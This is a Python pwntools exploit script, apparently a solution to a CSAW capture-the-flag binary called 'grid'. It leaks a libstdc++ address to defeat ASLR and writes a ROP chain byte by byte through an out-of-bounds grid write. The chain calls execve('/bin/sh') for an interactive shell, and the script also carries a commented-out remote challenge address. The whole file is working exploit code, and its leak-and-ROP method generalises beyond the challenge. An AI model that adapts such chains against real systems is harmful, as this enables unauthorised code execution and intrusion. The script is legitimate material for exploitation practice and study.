#!/usr/bin/env python3

from pwn import *

exe = ELF("./grid")

libstdc = ELF("./libstdc.so.6.0.25")


context.binary = exe


def conn():
        return process("./grid", env={"LD_PRELOAD":"./libstdc.so.6.0.25"})

def leak(r):
    r.sendlineafter("ape> ", "d")

def set_shape(r, value):
    r.sendlineafter("ape> ", value)

def set_loc_shape(r,loc , shape):
    set_shape(r, loc)
    r.sendlineafter("loc> ", str(shape))

    
def write_qword(r, offset, what):
    what = p64(what)
    print(what)
    count = offset
    for i in what:
        set_loc_shape(r, chr(i)+"00", count)
        print("Done ", chr(i))
        count += 1

#rdi = 0x00000000006020a0
#rsi = wanted address to leak
#call 0x4008e0

def main():
    r = conn()
#    r = remote("pwn.chal.csaw.io", 5013)
    leak(r)
    PopRdi = 0x0000000000400ee3

    
    DATA = r.recvuntil("sh")
    print(DATA)
    stack = DATA[-13::]
    libstdc_ = u64(DATA[37:37+6:] + b"\x00"*2)
    log.info("Libstdc leak @ 0x%x", libstdc_)

    libstdc_base = libstdc_-0xfb5da

    log.info("libstdc base @ 0x%x", libstdc_base)

    syscall = 0x0000000000001904 + libstdc_base
    PopRdx = 0x00000000000057cf + libstdc_base
    PopRsi = 0x000000000000bc50 + libstdc_base
    PopRax = 0x000000000000484c + libstdc_base
    PushRsp = 0x00000000000eda68+ libstdc_base
    PushRdi = 0x0000000000135938 + libstdc_base
    gadget = 0x00000000000d2eb0 + libstdc_base #: mov rax, rsi; mov qword ptr [rdi], rsi; ret; 

#    write_qword(r, 128+8*10, 0x68732f6e69622f)
    write_qword(r, 128, PopRsi)
    write_qword(r, 128+8*1, u64("/bin/sh\x00"))
    write_qword(r, 128+8*2, PopRdi)
    write_qword(r, 128+8*3, 0x6022e0)
    write_qword(r, 128+8*4, gadget)
    write_qword(r, 128+8*5, PopRsi)
    write_qword(r, 128+8*6 , 0)
    write_qword(r, 128+8*7 ,PopRax)
    write_qword(r, 128+8*8 ,0x3b)
    write_qword(r, 128+8*9, PopRdx)
    write_qword(r, 128+8*10,0)
    write_qword(r, 128+8*11, syscall)
    
    set_loc_shape(r, b"\x5200", 120) #ret

    gdb.attach(r, "v\nb * 0x0400bbf")
    r.interactive()


if __name__ == "__main__":
    main()